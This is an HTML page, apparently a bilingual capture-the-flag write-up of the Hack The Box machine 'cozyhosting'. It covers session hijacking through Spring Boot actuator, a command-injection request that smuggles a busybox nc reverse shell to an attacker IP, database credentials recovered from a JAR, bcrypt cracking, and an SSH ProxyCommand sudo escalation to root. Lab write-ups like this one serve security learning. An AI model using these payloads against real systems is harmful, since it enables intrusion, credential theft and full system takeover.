@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>cozyhosting | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">cozyhosting</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-easy">easy</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running a Java Spring Boot application with exposed actuator endpoints. By accessing the <code>/actuator/sessions</code> endpoint, I discovered an active session cookie belonging to user <code>kanderson</code>, which granted administrative access to the application.</p>
+
+                    <p>The admin panel contained a functionality to check SSH connectivity to remote hosts. This feature was vulnerable to command injection through the username parameter, where whitespace filtering could be bypassed using the Internal Field Separator (<code>${IFS}</code>). By injecting a reverse shell payload using <code>busybox nc</code>, I gained initial access as the <code>app</code> user.</p>
+
+                    <p>Post-exploitation enumeration revealed a JAR file containing PostgreSQL credentials in the application properties. Connecting to the database exposed bcrypt password hashes, one of which cracked to reveal the password <code>manchesterunited</code> for user <code>josh</code>. This user had sudo permissions to execute <code>/usr/bin/ssh</code> with any arguments, which was exploited using the <code>ProxyCommand</code> option to execute arbitrary commands as root.</p>
+
+                    <p><strong>Technologies/Exploits:</strong> Spring Boot actuator misconfiguration, session hijacking, command injection via IFS bypass, PostgreSQL credential exposure, bcrypt hash cracking, SSH ProxyCommand privilege escalation via sudo misconfiguration.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>I begin with an nmap scan to identify open ports and running services on the target:</p>
+                <p><img src="./media/image4.png" alt="Nmap scan results showing open ports including SSH on port 22 and HTTP on port 80" /></p>
+
+                <p>The scan reveals SSH running on port 22 and an HTTP server on port 80. I add <code>cozyhosting.htb</code> to my <code>/etc/hosts</code> file to resolve the hostname locally.</p>
+
+                <h3>Web Technology Fingerprinting</h3>
+                <p>Running <code>whatweb</code> provides additional information about the web stack:</p>
+                <pre><code class="language-plaintext">http://cozyhosting.htb [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], 
+Email[info@cozyhosting.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], 
+IP[10.10.11.230], Lightbox, Script, Title[Cozy Hosting - Home], 
+UncommonHeaders[x-content-type-options], X-Frame-Options[DENY], X-XSS-Protection[0], 
+nginx[1.18.0]</code></pre>
+
+                <p>When accessing <code>http://cozyhosting.htb/index.html</code>, I encounter a distinctive error page:</p>
+                <pre><code class="language-plaintext">Whitelabel Error Page
+
+This application has no explicit mapping for /error, so you are seeing this as a fallback.
+
+There was an unexpected error (type=Not Found, status=404).</code></pre>
+
+                <p>This "Whitelabel Error Page" is characteristic of Java Spring Boot applications, indicating the underlying technology stack.</p>
+
+                <h2>Directory Enumeration - Spring Boot Discovery</h2>
+                <p>Using <code>feroxbuster</code>, I discover several interesting endpoints including <code>/login</code> and <code>/admin</code>. To specifically target Spring Boot applications, I perform a more focused enumeration using a Spring Boot-specific wordlist:</p>
+                <pre><code class="language-bash">feroxbuster -u http://cozyhosting.htb -w /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt</code></pre>
+
+                <p>This reveals multiple endpoints under the <code>/actuator</code> path, which are management and monitoring endpoints commonly exposed in Spring Boot applications.</p>
+
+                <h2>Spring Boot Actuator Exploitation</h2>
+                <p>Spring Boot Actuator provides several management endpoints that can leak sensitive information if improperly secured. Navigating to <code>http://cozyhosting.htb/actuator/sessions</code>, I discover active session data including a session cookie for user <code>kanderson</code>.</p>
+
+                <h3>Session Hijacking</h3>
+                <p>I copy the session cookie value from the <code>/actuator/sessions</code> endpoint and replace my own session cookie in the browser. With this stolen session, I can now access the <code>/admin</code> panel that was previously restricted.</p>
+
+                <h2>Admin Panel Analysis</h2>
+                <p>The admin panel presents an SSH connectivity checker interface:</p>
+                <p><img src="./media/image3.png" alt="Admin panel showing a form to check SSH connectivity with hostname and username fields" /></p>
+
+                <p>This functionality appears to test SSH connectivity to remote hosts. I can input a hostname and username, and the application attempts an SSH connection.</p>
+
+                <h3>Testing the SSH Functionality</h3>
+                <p>To understand how this feature works, I set up a netcat listener on port 22:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 22</code></pre>
+
+                <p>When I submit my IP address with an arbitrary username through the form, I receive an SSH connection attempt:</p>
+                <pre><code class="language-plaintext">listening on [any] 22 ...
+connect to [10.10.16.2] from (UNKNOWN) [10.10.11.230] 38630
+SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.3</code></pre>
+
+                <p>This confirms the application is executing SSH commands on the backend. The connection doesn't proceed beyond the initial handshake because it's attempting key-based authentication rather than password authentication.</p>
+
+                <h2>Command Injection Discovery</h2>
+                <p>Using Burp Suite to intercept and analyze the HTTP requests, I discover that when providing a valid hostname (like <code>localhost</code>), the application executes an SSH command and returns error messages that reveal internal command execution.</p>
+
+                <p><img src="./media/image2.png" alt="Burp Suite request showing error message indicating whitespace filtering in the username parameter" /></p>
+
+                <p>The error messages indicate that the application is filtering whitespace characters in the username parameter, likely as a security measure to prevent command injection.</p>
+
+                <h3>Bypassing Whitespace Filtering</h3>
+                <p>While spaces are filtered, I can bypass this restriction using the Internal Field Separator (<code>${IFS}</code>), which is a special bash variable that acts as a delimiter (defaulting to space, tab, and newline). This is a common technique to bypass basic command injection filters.</p>
+
+                <p>I confirm command execution with a simple test:</p>
+                <p><img src="./media/image1.png" alt="Burp Suite response showing successful command injection using IFS to bypass whitespace filtering" /></p>
+
+                <h2>Initial Access - Reverse Shell</h2>
+                <p>With confirmed command injection, I craft a reverse shell payload using <code>busybox nc</code> (a lightweight netcat implementation often available on minimal systems). The payload uses <code>${IFS}</code> to replace spaces and <code>%0a</code> (URL-encoded newline) to separate commands:</p>
+                <pre><code class="language-http">POST /executessh HTTP/1.1
+Host: cozyhosting.htb
+Content-Type: application/x-www-form-urlencoded
+
+host=localhost&username=a${IFS}%0abusybox${IFS}nc${IFS}10.10.16.2${IFS}443${IFS}-e${IFS}sh%0a</code></pre>
+
+                <p>Breaking down this payload:</p>
+                <ul>
+                    <li><code>host=localhost</code> - Uses a valid hostname to pass validation</li>
+                    <li><code>username=a${IFS}%0a</code> - Starts with a dummy username followed by a newline to terminate the SSH command</li>
+                    <li><code>busybox${IFS}nc${IFS}10.10.16.2${IFS}443${IFS}-e${IFS}sh%0a</code> - Executes busybox netcat connecting back to my machine on port 443, with the <code>-e sh</code> flag to execute a shell upon connection</li>
+                </ul>
+
+                <p>Setting up a listener:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>I successfully receive a reverse shell as the <code>app</code> user.</p>
+
+                <h2>Post-Exploitation Enumeration</h2>
+                <p>After gaining access, I begin enumerating the system. In the <code>/home</code> directory, I notice a user named <code>josh</code>, who likely has access to the user flag.</p>
+
+                <p>I also discover that PostgreSQL is running locally on the machine. In the <code>/app</code> directory, I find the application JAR file:</p>
+                <pre><code class="language-bash">ls -la /app
+-rw-r--r-- 1 root root 60259688 Aug 11 2023 cloudhosting-0.0.1.jar</code></pre>
+
+                <h3>Extracting Application Secrets</h3>
+                <p>JAR files are essentially ZIP archives that can be extracted. I extract the contents to analyze the application configuration:</p>
+                <pre><code class="language-bash">unzip cloudhosting-0.0.1.jar -d /tmp/extracted/</code></pre>
+
+                <p>Inside the extracted files, I locate the Spring Boot application properties file, which contains database credentials:</p>
+                <pre><code class="language-bash">cat /tmp/extracted/BOOT-INF/classes/application.properties</code></pre>
+
+                <p>The configuration file reveals:</p>
+                <pre><code class="language-properties">server.address=127.0.0.1
+server.servlet.session.timeout=5m
+management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
+management.endpoint.sessions.enabled = true
+spring.datasource.driver-class-name=org.postgresql.Driver
+spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
+spring.jpa.hibernate.ddl-auto=none
+spring.jpa.database=POSTGRESQL
+spring.datasource.platform=postgres
+spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
+spring.datasource.username=postgres
+spring.datasource.password=Vg&nvzAQ7XxR</code></pre>
+
+                <p>These credentials grant access to the PostgreSQL database.</p>
+
+                <h2>Database Enumeration</h2>
+                <p>Connecting to PostgreSQL with the discovered credentials:</p>
+                <pre><code class="language-bash">psql -h localhost -U postgres -d cozyhosting</code></pre>
+
+                <p>Querying the users table reveals password hashes:</p>
+                <pre><code class="language-sql">SELECT * FROM users;</code></pre>
+
+                <pre><code class="language-plaintext">   name    |                           password                           | role  
+-----------+--------------------------------------------------------------+-------
+ kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
+ admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin</code></pre>
+
+                <p>These are bcrypt hashes (identifiable by the <code>$2a$</code> prefix), which are designed to be computationally expensive to crack.</p>
+
+                <h3>Password Cracking</h3>
+                <p>I save the admin hash to a file and attempt to crack it using hashcat with mode 3200 (bcrypt):</p>
+                <pre><code class="language-bash">hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+                <p>The hash successfully cracks:</p>
+                <pre><code class="language-plaintext">$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited</code></pre>
+
+                <h2>Lateral Movement to User Josh</h2>
+                <p>Testing the cracked password with the <code>josh</code> user account:</p>
+                <pre><code class="language-bash">su josh
+Password: manchesterunited</code></pre>
+
+                <p>The password is valid, granting access to josh's account and allowing me to retrieve the user flag.</p>
+
+                <h2>Privilege Escalation - SSH ProxyCommand Abuse</h2>
+                <p>Checking sudo privileges for josh:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <pre><code class="language-plaintext">Matching Defaults entries for josh on localhost:
+    env_reset, mail_badpass, 
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, 
+    use_pty
+
+User josh may run the following commands on localhost:
+    (root) /usr/bin/ssh *</code></pre>
+
+                <p>Josh can execute <code>/usr/bin/ssh</code> with any arguments as root without a password. This is a dangerous sudo configuration that can be exploited for privilege escalation.</p>
+
+                <h3>Understanding ProxyCommand Exploitation</h3>
+                <p>SSH's <code>ProxyCommand</code> option allows executing an arbitrary command before establishing an SSH connection. This is typically used for connecting through proxy servers or jump hosts, but when combined with sudo permissions, it becomes a privilege escalation vector.</p>
+
+                <p>According to GTFOBins (<a href="https://gtfobins.github.io/gtfobins/ssh/#sudo">https://gtfobins.github.io/gtfobins/ssh/#sudo</a>), the following command will spawn a root shell:</p>
+                <pre><code class="language-bash">sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x</code></pre>
+
+                <p>This works because:</p>
+                <ul>
+                    <li>The <code>ProxyCommand</code> executes before SSH tries to connect</li>
+                    <li>The semicolon terminates the proxy command context and starts a new command</li>
+                    <li><code>sh 0<&2 1>&2</code> spawns a shell with stdin and stdout redirected to stderr, providing an interactive shell</li>
+                    <li>The command runs with root privileges due to sudo</li>
+                    <li>The <code>x</code> at the end is a dummy hostname that SSH never actually tries to connect to</li>
+                </ul>
+
+                <h3>Obtaining Root Access</h3>
+                <p>Executing the privilege escalation:</p>
+                <pre><code class="language-bash">sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x</code></pre>
+
+                <pre><code class="language-plaintext"># whoami
+root
+#</code></pre>
+
+                <p>I now have root access and can retrieve the root flag, completing the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba una aplicación Java Spring Boot con endpoints actuator expuestos. Al acceder al endpoint <code>/actuator/sessions</code>, descubrí una cookie de sesión activa perteneciente al usuario <code>kanderson</code>, que otorgaba acceso administrativo a la aplicación.</p>
+
+                    <p>El panel de administración contenía una funcionalidad para comprobar conectividad SSH a hosts remotos. Esta característica era vulnerable a inyección de comandos a través del parámetro username, donde el filtrado de espacios en blanco podía evitarse usando el Internal Field Separator (<code>${IFS}</code>). Inyectando un payload de reverse shell usando <code>busybox nc</code>, conseguí acceso inicial como usuario <code>app</code>.</p>
+
+                    <p>La enumeración post-explotación reveló un archivo JAR conteniendo credenciales de PostgreSQL en las propiedades de la aplicación. Conectándome a la base de datos expuse hashes de contraseña bcrypt, uno de los cuales se crackeó revelando la contraseña <code>manchesterunited</code> para el usuario <code>josh</code>. Este usuario tenía permisos sudo para ejecutar <code>/usr/bin/ssh</code> con cualquier argumento, lo cual fue explotado usando la opción <code>ProxyCommand</code> para ejecutar comandos arbitrarios como root.</p>
+
+                    <p><strong>Tecnologías/Exploits:</strong> Mala configuración de actuator de Spring Boot, secuestro de sesión, inyección de comandos mediante bypass de IFS, exposición de credenciales PostgreSQL, crackeo de hash bcrypt, escalada de privilegios mediante SSH ProxyCommand vía mala configuración de sudo.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios en ejecución en el objetivo:</p>
+                <p><img src="./media/image4.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el puerto 22 y HTTP en el puerto 80" /></p>
+
+                <p>El escaneo revela SSH ejecutándose en el puerto 22 y un servidor HTTP en el puerto 80. Añado <code>cozyhosting.htb</code> a mi archivo <code>/etc/hosts</code> para resolver el hostname localmente.</p>
+
+                <h3>Fingerprinting de Tecnología Web</h3>
+                <p>Ejecutando <code>whatweb</code> proporciona información adicional sobre el stack web:</p>
+                <pre><code class="language-plaintext">http://cozyhosting.htb [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], 
+Email[info@cozyhosting.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], 
+IP[10.10.11.230], Lightbox, Script, Title[Cozy Hosting - Home], 
+UncommonHeaders[x-content-type-options], X-Frame-Options[DENY], X-XSS-Protection[0], 
+nginx[1.18.0]</code></pre>
+
+                <p>Al acceder a <code>http://cozyhosting.htb/index.html</code>, encuentro una página de error distintiva:</p>
+                <pre><code class="language-plaintext">Whitelabel Error Page
+
+This application has no explicit mapping for /error, so you are seeing this as a fallback.
+
+There was an unexpected error (type=Not Found, status=404).</code></pre>
+
+                <p>Esta "Whitelabel Error Page" es característica de aplicaciones Java Spring Boot, indicando la tecnología subyacente.</p>
+
+                <h2>Enumeración de Directorios - Descubrimiento de Spring Boot</h2>
+                <p>Usando <code>feroxbuster</code>, descubro varios endpoints interesantes incluyendo <code>/login</code> y <code>/admin</code>. Para apuntar específicamente a aplicaciones Spring Boot, realizo una enumeración más enfocada usando una wordlist específica de Spring Boot:</p>
+                <pre><code class="language-bash">feroxbuster -u http://cozyhosting.htb -w /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt</code></pre>
+
+                <p>Esto revela múltiples endpoints bajo la ruta <code>/actuator</code>, que son endpoints de gestión y monitorización comúnmente expuestos en aplicaciones Spring Boot.</p>
+
+                <h2>Explotación de Spring Boot Actuator</h2>
+                <p>Spring Boot Actuator proporciona varios endpoints de gestión que pueden filtrar información sensible si están incorrectamente asegurados. Navegando a <code>http://cozyhosting.htb/actuator/sessions</code>, descubro datos de sesiones activas incluyendo una cookie de sesión para el usuario <code>kanderson</code>.</p>
+
+                <h3>Secuestro de Sesión</h3>
+                <p>Copio el valor de la cookie de sesión del endpoint <code>/actuator/sessions</code> y reemplazo mi propia cookie de sesión en el navegador. Con esta sesión robada, ahora puedo acceder al panel <code>/admin</code> que previamente estaba restringido.</p>
+
+                <h2>Análisis del Panel de Administración</h2>
+                <p>El panel de administración presenta una interfaz de comprobador de conectividad SSH:</p>
+                <p><img src="./media/image3.png" alt="Panel de administración mostrando un formulario para comprobar conectividad SSH con campos de hostname y username" /></p>
+
+                <p>Esta funcionalidad parece probar la conectividad SSH a hosts remotos. Puedo introducir un hostname y username, y la aplicación intenta una conexión SSH.</p>
+
+                <h3>Probando la Funcionalidad SSH</h3>
+                <p>Para entender cómo funciona esta característica, configuro un listener de netcat en el puerto 22:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 22</code></pre>
+
+                <p>Cuando envío mi dirección IP con un username arbitrario a través del formulario, recibo un intento de conexión SSH:</p>
+                <pre><code class="language-plaintext">listening on [any] 22 ...
+connect to [10.10.16.2] from (UNKNOWN) [10.10.11.230] 38630
+SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.3</code></pre>
+
+                <p>Esto confirma que la aplicación está ejecutando comandos SSH en el backend. La conexión no procede más allá del handshake inicial porque está intentando autenticación basada en claves en lugar de autenticación por contraseña.</p>
+
+                <h2>Descubrimiento de Inyección de Comandos</h2>
+                <p>Usando Burp Suite para interceptar y analizar las peticiones HTTP, descubro que al proporcionar un hostname válido (como <code>localhost</code>), la aplicación ejecuta un comando SSH y devuelve mensajes de error que revelan ejecución interna de comandos.</p>
+
+                <p><img src="./media/image2.png" alt="Petición de Burp Suite mostrando mensaje de error indicando filtrado de espacios en blanco en el parámetro username" /></p>
+
+                <p>Los mensajes de error indican que la aplicación está filtrando caracteres de espacio en blanco en el parámetro username, probablemente como medida de seguridad para prevenir inyección de comandos.</p>
+
+                <h3>Eludiendo el Filtrado de Espacios en Blanco</h3>
+                <p>Aunque los espacios están filtrados, puedo eludir esta restricción usando el Internal Field Separator (<code>${IFS}</code>), que es una variable especial de bash que actúa como delimitador (por defecto espacio, tabulador y nueva línea). Esta es una técnica común para eludir filtros básicos de inyección de comandos.</p>
+
+                <p>Confirmo la ejecución de comandos con una prueba simple:</p>
+                <p><img src="./media/image1.png" alt="Respuesta de Burp Suite mostrando inyección de comandos exitosa usando IFS para eludir el filtrado de espacios en blanco" /></p>
+
+                <h2>Acceso Inicial - Reverse Shell</h2>
+                <p>Con inyección de comandos confirmada, creo un payload de reverse shell usando <code>busybox nc</code> (una implementación ligera de netcat frecuentemente disponible en sistemas minimalistas). El payload usa <code>${IFS}</code> para reemplazar espacios y <code>%0a</code> (nueva línea codificada en URL) para separar comandos:</p>
+                <pre><code class="language-http">POST /executessh HTTP/1.1
+Host: cozyhosting.htb
+Content-Type: application/x-www-form-urlencoded
+
+host=localhost&username=a${IFS}%0abusybox${IFS}nc${IFS}10.10.16.2${IFS}443${IFS}-e${IFS}sh%0a</code></pre>
+
+                <p>Desglosando este payload:</p>
+                <ul>
+                    <li><code>host=localhost</code> - Usa un hostname válido para pasar la validación</li>
+                    <li><code>username=a${IFS}%0a</code> - Comienza con un username dummy seguido de una nueva línea para terminar el comando SSH</li>
+                    <li><code>busybox${IFS}nc${IFS}10.10.16.2${IFS}443${IFS}-e${IFS}sh%0a</code> - Ejecuta busybox netcat conectándose a mi máquina en el puerto 443, con el flag <code>-e sh</code> para ejecutar una shell al conectarse</li>
+                </ul>
+
+                <p>Configurando un listener:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>Recibo exitosamente una reverse shell como usuario <code>app</code>.</p>
+
+                <h2>Enumeración Post-Explotación</h2>
+                <p>Tras conseguir acceso, comienzo enumerando el sistema. En el directorio <code>/home</code>, noto un usuario llamado <code>josh</code>, que probablemente tiene acceso a la flag de usuario.</p>
+
+                <p>También descubro que PostgreSQL se está ejecutando localmente en la máquina. En el directorio <code>/app</code>, encuentro el archivo JAR de la aplicación:</p>
+                <pre><code class="language-bash">ls -la /app
+-rw-r--r-- 1 root root 60259688 Aug 11 2023 cloudhosting-0.0.1.jar</code></pre>
+
+                <h3>Extrayendo Secretos de la Aplicación</h3>
+                <p>Los archivos JAR son esencialmente archivos ZIP que pueden extraerse. Extraigo el contenido para analizar la configuración de la aplicación:</p>
+                <pre><code class="language-bash">unzip cloudhosting-0.0.1.jar -d /tmp/extracted/</code></pre>
+
+                <p>Dentro de los archivos extraídos, localizo el archivo de propiedades de la aplicación Spring Boot, que contiene credenciales de base de datos:</p>
+                <pre><code class="language-bash">cat /tmp/extracted/BOOT-INF/classes/application.properties</code></pre>
+
+                <p>El archivo de configuración revela:</p>
+                <pre><code class="language-properties">server.address=127.0.0.1
+server.servlet.session.timeout=5m
+management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
+management.endpoint.sessions.enabled = true
+spring.datasource.driver-class-name=org.postgresql.Driver
+spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
+spring.jpa.hibernate.ddl-auto=none
+spring.jpa.database=POSTGRESQL
+spring.datasource.platform=postgres
+spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
+spring.datasource.username=postgres
+spring.datasource.password=Vg&nvzAQ7XxR</code></pre>
+
+                <p>Estas credenciales otorgan acceso a la base de datos PostgreSQL.</p>
+
+                <h2>Enumeración de Base de Datos</h2>
+                <p>Conectándome a PostgreSQL con las credenciales descubiertas:</p>
+                <pre><code class="language-bash">psql -h localhost -U postgres -d cozyhosting</code></pre>
+
+                <p>Consultando la tabla users revela hashes de contraseña:</p>
+                <pre><code class="language-sql">SELECT * FROM users;</code></pre>
+
+                <pre><code class="language-plaintext">   name    |                           password                           | role  
+-----------+--------------------------------------------------------------+-------
+ kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
+ admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin</code></pre>
+
+                <p>Estos son hashes bcrypt (identificables por el prefijo <code>$2a$</code>), que están diseñados para ser computacionalmente costosos de crackear.</p>
+
+                <h3>Crackeo de Contraseñas</h3>
+                <p>Guardo el hash de admin en un archivo e intento crackearlo usando hashcat con modo 3200 (bcrypt):</p>
+                <pre><code class="language-bash">hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+                <p>El hash se crackea exitosamente:</p>
+                <pre><code class="language-plaintext">$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited</code></pre>
+
+                <h2>Movimiento Lateral al Usuario Josh</h2>
+                <p>Probando la contraseña crackeada con la cuenta del usuario <code>josh</code>:</p>
+                <pre><code class="language-bash">su josh
+Password: manchesterunited</code></pre>
+
+                <p>La contraseña es válida, otorgando acceso a la cuenta de josh y permitiéndome recuperar la flag de usuario.</p>
+
+                <h2>Escalada de Privilegios - Abuso de SSH ProxyCommand</h2>
+                <p>Comprobando privilegios sudo para josh:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <pre><code class="language-plaintext">Matching Defaults entries for josh on localhost:
+    env_reset, mail_badpass, 
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, 
+    use_pty
+
+User josh may run the following commands on localhost:
+    (root) /usr/bin/ssh *</code></pre>
+
+                <p>Josh puede ejecutar <code>/usr/bin/ssh</code> con cualquier argumento como root sin contraseña. Esta es una configuración peligrosa de sudo que puede explotarse para escalada de privilegios.</p>
+
+                <h3>Entendiendo la Explotación de ProxyCommand</h3>
+                <p>La opción <code>ProxyCommand</code> de SSH permite ejecutar un comando arbitrario antes de establecer una conexión SSH. Esto se usa típicamente para conectarse a través de servidores proxy o jump hosts, pero cuando se combina con permisos sudo, se convierte en un vector de escalada de privilegios.</p>
+
+                <p>Según GTFOBins (<a href="https://gtfobins.github.io/gtfobins/ssh/#sudo">https://gtfobins.github.io/gtfobins/ssh/#sudo</a>), el siguiente comando generará una shell de root:</p>
+                <pre><code class="language-bash">sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x</code></pre>
+
+                <p>Esto funciona porque:</p>
+                <ul>
+                    <li>El <code>ProxyCommand</code> se ejecuta antes de que SSH intente conectarse</li>
+                    <li>El punto y coma termina el contexto del comando proxy e inicia un nuevo comando</li>
+                    <li><code>sh 0<&2 1>&2</code> genera una shell con stdin y stdout redirigidos a stderr, proporcionando una shell interactiva</li>
+                    <li>El comando se ejecuta con privilegios de root debido a sudo</li>
+                    <li>La <code>x</code> al final es un hostname dummy al que SSH nunca intenta conectarse realmente</li>
+                </ul>
+
+                <h3>Obteniendo Acceso Root</h3>
+                <p>Ejecutando la escalada de privilegios:</p>
+                <pre><code class="language-bash">sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x</code></pre>
+
+                <pre><code class="language-plaintext"># whoami
+root
+#</code></pre>
+
+                <p>Ahora tengo acceso root y puedo recuperar la flag de root, completando la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
